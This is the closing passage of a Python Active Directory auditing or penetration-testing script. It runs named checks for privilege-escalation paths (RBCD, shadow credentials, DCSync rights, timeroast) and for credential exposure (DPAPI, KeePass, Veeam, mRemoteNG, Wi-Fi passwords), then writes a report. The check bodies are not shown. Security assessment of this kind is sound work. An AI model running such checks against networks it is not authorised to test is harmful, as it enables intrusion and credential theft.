    if "dacl"        not in skips: check_dacl_abuse(dc_ip, u, pw, domain, nh)
    if "gpo"         not in skips: check_gpo_permissions(dc_ip, u, pw, domain, nh)
    if "ipv6"        not in skips: check_ipv6(dc_ip, u, pw, domain, subnet, nh)
    if "winrm"       not in skips: check_winrm(dc_ip, u, pw, domain, nh)
    if "mssql"       not in skips: check_mssql_instances(dc_ip, u, pw, domain, subnet, nh)
    if "rdpnla"      not in skips: check_rdp_nla(dc_ip, u, pw, domain, nh)
    if "smbv1"       not in skips: check_smbv1(dc_ip, u, pw, domain, nh)
    if "snmp"        not in skips: check_snmp(dc_ip, subnet)
    if "nullbind"    not in skips: check_ldap_null_bind(dc_ip)
    if "nfs"         not in skips: check_nfs(dc_ip, subnet)
    if "ipmi"        not in skips: check_ipmi(dc_ip, subnet)
    if "wsus"        not in skips: check_wsus(dc_ip, u, pw, domain, nh)
    if "shares"      not in skips: check_smb_shares(dc_ip, u, pw, domain, nh)
    if "spider"      not in skips: check_share_spider(dc_ip, u, pw, domain, nh)
    if "rodc"        not in skips: check_rodc(dc_ip, u, pw, domain, nh)
    if "smtp"        not in skips: check_smtp_relay(dc_ip, subnet)
    if "redis"       not in skips: check_redis(dc_ip, subnet)
    if "elastic"     not in skips: check_elasticsearch(dc_ip)
    if "jenkins"     not in skips: check_jenkins_tomcat(dc_ip, subnet)
    if "mssqllinked" not in skips: check_mssql_linked(dc_ip, u, pw, domain, subnet, nh)
    if "trusts"      not in skips: check_trusts(dc_ip, u, pw, domain, nh)
    if "azuread"     not in skips: check_azure_ad_connect(dc_ip, u, pw, domain, nh)
    if "bloodhound"  not in skips: check_bloodhound(dc_ip, u, pw, domain, nh)
    if "avedr"       not in skips: check_av_edr(dc_ip, u, pw, domain, nh)
    if "aie"         not in skips: check_always_install_elevated(dc_ip, u, pw, domain, nh)
    if "localadmin"  not in skips: check_local_admin(dc_ip, u, pw, domain, subnet, nh)

    # ── PrivEsc — AD ──────────────────────────────────────────────────────────
    if "rbcd"           not in skips: check_rbcd(dc_ip, u, pw, domain, nh)
    if "shadowcreds"    not in skips: check_shadow_credentials(dc_ip, u, pw, domain, nh)
    if "dcsync"         not in skips: check_dcsync_rights(dc_ip, u, pw, domain, nh)
    if "gpoabuse"       not in skips: check_gpo_abuse(dc_ip, u, pw, domain, nh)
    if "badsuccessor"   not in skips: check_badsuccessor(dc_ip, u, pw, domain, nh)
    if "ntlmv1"         not in skips: check_ntlmv1(dc_ip, u, pw, domain, subnet, nh)
    if "timeroast"      not in skips: check_timeroast(dc_ip, u, pw, domain, nh)
    # ── PrivEsc — Local ───────────────────────────────────────────────────────
    if "unquotedsvc"    not in skips: check_unquoted_service_paths(dc_ip, u, pw, domain, subnet, nh)
    if "seimpers"       not in skips: check_seimpersonate(dc_ip, u, pw, domain, nh)
    if "autologon"      not in skips: check_autologon_registry(dc_ip, u, pw, domain, subnet, nh)
    # ── Credential Exposure (new) ─────────────────────────────────────────────
    if "dpapi"          not in skips: check_dpapi(dc_ip, u, pw, domain, subnet, nh)
    if "keepass"        not in skips: check_keepass(dc_ip, u, pw, domain, subnet, nh)
    if "veeam"          not in skips: check_veeam_creds(dc_ip, u, pw, domain, subnet, nh)
    if "mremoteng"      not in skips: check_mremoteng_creds(dc_ip, u, pw, domain, subnet, nh)
    if "wifi"           not in skips: check_wifi_passwords(dc_ip, u, pw, domain, subnet, nh)

    # ── Report ────────────────────────────────────────────────────────────────
    section("Generating Report")
    report = generate_report(dc_ip, domain, args.output)
    log(f"Report saved to: {report}", "good")

    # ── Final Summary ─────────────────────────────────────────────────────────
    print(f"\n{BOLD}{C}{'═'*60}{RST}")
    print(f"{BOLD}  FINAL SUMMARY{RST}")
    print(f"{BOLD}{C}{'═'*60}{RST}")
    for r in results:
        if is_vuln(r["status"]):
            icon = f"{R}🔴{RST}"
        elif is_safe(r["status"]):
            icon = f"{G}🟢{RST}"
        else:
            icon = f"{Y}🟡{RST}"
        print(f"  {icon}  {r['check']:<45} {BOLD}{r['status']}{RST}")
    print(f"{BOLD}{C}{'═'*60}{RST}\n")


if __name__ == "__main__":
    main()
